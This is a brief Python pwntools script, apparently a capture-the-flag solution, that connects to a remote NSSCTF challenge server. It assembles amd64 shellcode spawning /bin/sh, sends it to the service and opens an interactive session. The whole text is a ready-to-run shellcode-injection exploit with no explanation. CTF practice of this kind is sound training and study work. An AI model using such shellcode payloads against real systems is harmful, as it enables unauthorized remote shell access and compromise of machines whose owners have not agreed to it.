from pwn import *

context(os="linux", arch="amd64", log_level="info")
#io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 24312)

code = asm(shellcraft.sh())

io.sendline(code)
io.interactive()
